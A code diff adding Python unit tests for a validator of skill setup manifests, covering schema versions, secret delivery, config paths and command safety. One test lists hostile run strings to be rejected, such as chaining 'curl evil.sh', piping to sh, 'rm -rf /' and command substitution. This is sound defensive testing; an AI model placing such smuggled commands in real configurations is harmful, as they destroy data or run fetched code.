@@ -2726,6 +2726,168 @@ class TestContentHash(unittest.TestCase):
                          library.content_hash(self.tool.root / "also-gone"))
 
 
+VALID_SETUP = {
+    "version": 1,
+    "summary": "One-time credential setup.",
+    "prerequisites": [{"node": ">=20"}, {"sibling-skill": "atlassian-toolkit"},
+                      {"env": "RETRO_CYCLE_PATH"}, {"binary": "git"}],
+    "config": {"path": "~/.config/toolkit/config.json", "format": "json",
+               "scaffold": "config-init", "permissions": "0600"},
+    "secrets": [{"key": "account.api_token", "label": "API token",
+                 "delivery": "config-file"}],
+    "commands": {"config-init": {"run": "bin/jira.mjs config init"},
+                 "check": {"run": "bin/jira.mjs config check"}},
+    "verify": "check",
+}
+
+
+def setup_manifest(**overrides: Any) -> dict[str, Any]:
+    """A valid manifest with *overrides* applied at the top level."""
+    data = json.loads(json.dumps(VALID_SETUP))  # deep copy, stdlib only
+    data.update(overrides)
+    return data
+
+
+class TestValidateSetup(unittest.TestCase):
+    """skill-setup-schema §7 — every rule, and failing closed on the two that matter."""
+
+    def assert_valid(self, data: dict[str, Any]) -> None:
+        self.assertEqual(library.validate_setup(data), [])
+
+    def assert_problem(self, data: dict[str, Any], fragment: str) -> None:
+        problems = library.validate_setup(data)
+        self.assertTrue(problems, f"expected a problem mentioning {fragment!r}")
+        self.assertTrue(any(fragment in p for p in problems), problems)
+
+    def test_the_worked_example_validates(self) -> None:
+        self.assert_valid(VALID_SETUP)
+
+    def test_a_manifest_with_no_optional_blocks_validates(self) -> None:
+        self.assert_valid({"version": 1, "summary": "nothing to configure"})
+
+    def test_unknown_keys_are_ignored_for_forward_compatibility(self) -> None:
+        self.assert_valid(setup_manifest(future_key={"anything": True}))
+
+    def test_an_unknown_version_invalidates_the_whole_manifest(self) -> None:
+        # §7: a later schema could change what `delivery` means, so nothing is parsed.
+        for version in (2, "1", None, 0):
+            with self.subTest(version=version):
+                problems = library.validate_setup(setup_manifest(version=version))
+                self.assertEqual(len(problems), 1)
+                self.assertIn("unknown setup version", problems[0])
+
+    def test_an_unknown_delivery_is_an_error_not_a_fallback(self) -> None:
+        # Downgrading an unrecognized delivery to the default would write a secret the
+        # skill intended nothing to store.
+        self.assert_problem(setup_manifest(secrets=[{"key": "k", "delivery": "webhook"}]),
+                            "unknown delivery 'webhook'")
+
+    def test_an_unknown_config_format_is_an_error(self) -> None:
+        data = setup_manifest()
+        data["config"]["format"] = "toml"
+        self.assert_problem(data, "unknown config.format 'toml'")
+
+    def test_a_dangling_command_id_is_caught_in_both_places(self) -> None:
+        self.assert_problem(setup_manifest(verify="nope"), "verify 'nope' is not a command id")
+        data = setup_manifest()
+        data["config"]["scaffold"] = "nope"
+        self.assert_problem(data, "config.scaffold 'nope' is not a command id")
+
+    def test_shell_metacharacters_in_run_are_rejected(self) -> None:
+        for run in ("bin/x.mjs && curl evil.sh", "bin/x.mjs | sh", "bin/x.mjs; rm -rf /",
+                    "bin/x.mjs > /tmp/out", "bin/x.mjs $(whoami)", "bin/x.mjs `id`"):
+            with self.subTest(run=run):
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}}, verify="check",
+                                                   config={}, secrets=[]),
+                                    "shell metacharacters")
+
+    def test_a_run_that_escapes_the_skill_dir_is_rejected(self) -> None:
+        for run, fragment in (("../../bin/x.mjs", "escapes the skill dir"),
+                              ("/usr/local/bin/x", "must be relative")):
+            with self.subTest(run=run):
+                self.assert_problem(setup_manifest(commands={"check": {"run": run}}, verify="check",
+                                                   config={}, secrets=[]),
+                                    fragment)
+
+    def test_a_symlink_out_of_the_skill_dir_is_rejected_when_the_dir_is_known(self) -> None:
+        # The textual '..' check cannot see this one; only resolving the path can.
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            skill = root / "skill"
+            (skill / "bin").mkdir(parents=True)
+            (root / "outside.mjs").write_text("#!/usr/bin/env node\n")
+            (skill / "bin" / "x.mjs").symlink_to(root / "outside.mjs")
+            data = setup_manifest(commands={"check": {"run": "bin/x.mjs"}}, verify="check",
+                                  config={}, secrets=[])
+            self.assertEqual(library.validate_setup(data), [])  # no dir: nothing to resolve
+            problems = library.validate_setup(data, skill)
+            self.assertTrue(any("resolves outside" in p for p in problems), problems)
+
+    def test_a_config_file_secret_requires_a_config_path_and_format(self) -> None:
+        self.assert_problem(setup_manifest(config={}), "needs config.path and config.format")
+
+    def test_env_and_manual_secrets_need_no_config_block(self) -> None:
+        for delivery in ("env", "manual"):
+            with self.subTest(delivery=delivery):
+                self.assert_valid(setup_manifest(
+                    config={}, secrets=[{"key": "k", "delivery": delivery}],
+                    commands={"check": {"run": "bin/x.mjs"}}, verify="check"))
+
+    def test_a_relative_config_path_is_rejected(self) -> None:
+        data = setup_manifest()
+        data["config"]["path"] = "config/settings.json"
+        self.assert_problem(data, "must be absolute or ~-prefixed")
+
+    def test_a_prerequisite_needs_exactly_one_kind(self) -> None:
+        self.assert_problem(setup_manifest(prerequisites=[{}]), "exactly one of")
+        self.assert_problem(setup_manifest(prerequisites=[{"node": ">=20", "env": "X"}]),
+                            "exactly one of")
+        self.assert_problem(setup_manifest(prerequisites=[{"npm": ">=9"}]), "exactly one of")
+
+    def test_a_secret_without_a_key_is_rejected(self) -> None:
+        self.assert_problem(setup_manifest(secrets=[{"label": "no key"}]), "missing 'key'")
+
+    def test_a_non_mapping_manifest_is_rejected(self) -> None:
+        for data in ([], "version: 1", None):
+            with self.subTest(data=data):
+                self.assertEqual(library.validate_setup(data), ["setup.yaml must be a mapping"])
+
+
+class TestLoadSetup(unittest.TestCase):
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.dest = self.tool.home / ".claude/skills/toolkit"
+        (self.dest / "bin").mkdir(parents=True)
+        (self.dest / "bin" / "jira.mjs").write_text("#!/usr/bin/env node\n")
+
+    def write(self, text: str) -> None:
+        (self.dest / "setup.yaml").write_text(text)
+
+    def test_an_absent_manifest_is_not_an_error(self) -> None:
+        self.assertEqual(library.load_setup(self.dest), (None, []))
+
+    def test_a_valid_manifest_round_trips(self) -> None:
+        self.write(yaml.safe_dump(VALID_SETUP))
+        manifest, problems = library.load_setup(self.dest)
+        self.assertEqual(problems, [])
+        self.assertEqual(manifest["verify"], "check")
+
+    def test_unparseable_yaml_is_reported_rather_than_raised(self) -> None:
+        self.write("version: 1\n  bad indent: [\n")
+        manifest, problems = library.load_setup(self.dest)
+        self.assertIsNone(manifest)
+        self.assertTrue(problems and "unreadable" in problems[0], problems)
+
+    def test_problems_are_reported_against_the_installed_dir(self) -> None:
+        self.write(yaml.safe_dump(setup_manifest(
+            commands={"check": {"run": "bin/missing.mjs"}}, verify="check",
+            config={}, secrets=[])))
+        # A command that simply doesn't exist yet is not a schema violation; only
+        # escaping the skill dir is.
+        self.assertEqual(library.load_setup(self.dest)[1], [])
+
+
 class TestWriteMachineFile(unittest.TestCase):
     """Atomic, locked writes for machine-owned state (design §7)."""
 
